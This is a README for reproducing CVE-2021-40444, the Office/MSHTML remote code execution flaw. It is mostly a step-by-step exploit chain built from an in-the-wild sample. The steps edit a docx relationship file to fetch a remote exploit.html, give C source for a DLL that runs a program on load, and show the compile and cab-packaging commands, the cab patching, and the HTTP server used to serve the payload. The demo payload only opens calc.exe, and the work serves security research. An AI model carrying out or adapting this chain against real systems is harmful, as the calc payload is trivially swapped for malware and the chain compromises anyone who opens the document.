# CVE-2021-40444

Reproduce steps for CVE-2021-40444

These reproduction steps are based on some reverse engineering over the sample used in-the-wild: 938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52 (docx file).

## Generating docx

Go to `maldoc/word/_rels/document.xml.rels` and edit the two ocurrences for `http://<HOST>` with the URL to the exploit.html Eg.: `http://127.0.0.1/exploit.html` file.

Generate docx:

`cd maldoc/ ; zip -r maldoc.docx *`

## Generating malicious cab

```
#include <windows.h>

void exec(void) {
	system("C:\\Windows\\System32\\calc.exe");
	return;
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason, 
    LPVOID lpReserved )
{
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
           exec(); 
           break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

Exec:

`i686-w64-mingw32-gcc -shared calc.c -o calc.dll`

Generate cab (install lcab `sudo apt-get install lcab`)

`cp calc.dll championship.inf ; mkdir gen/ ; cd gen/ ; lcab '../championship.inf' out.cab`

Copy out.cab into `www/` directory, modify exploit.html to point to `http://127.0.0.1/out.cab`
  
Execute Python script: `patch_cab.py`
  
Finally, setup server:
  
`cd www/ ; sudo python3 -m http.server 80`

# End

Execute now maldoc.docx in target VM

If not working, make sure there is a `championship.inf` file at `C:\Users\<user>\AppData\Temp\`

If file is present but DLL did not get executed, make sure you are opening docx from a folder reached from by exploit.html, like Documents, Desktop, or Downloads.

# More

To automatically resolve the array obfuscation on HTML file use `deobfuscate.py` (already has hardcoded the mutated array)

Anyway, there is already a deobfuscated version: `deob.html`
